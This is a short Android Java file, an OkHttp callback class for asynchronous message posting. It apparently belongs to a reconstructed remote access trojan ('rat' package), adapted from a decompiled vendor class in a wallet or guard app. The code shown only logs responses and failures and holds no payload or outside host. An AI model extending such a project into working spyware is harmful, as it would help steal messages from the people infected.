package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.t (PostMessageCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * PostMessageCallback - 异步消息发送回调
 * vendor: 解析 ApiResult<Boolean>，成功后日志 "异步发送消息成功"
 */
public final class t implements Callback {

    private static final String TAG = "PostMessageCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "异步发送消息成功"
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
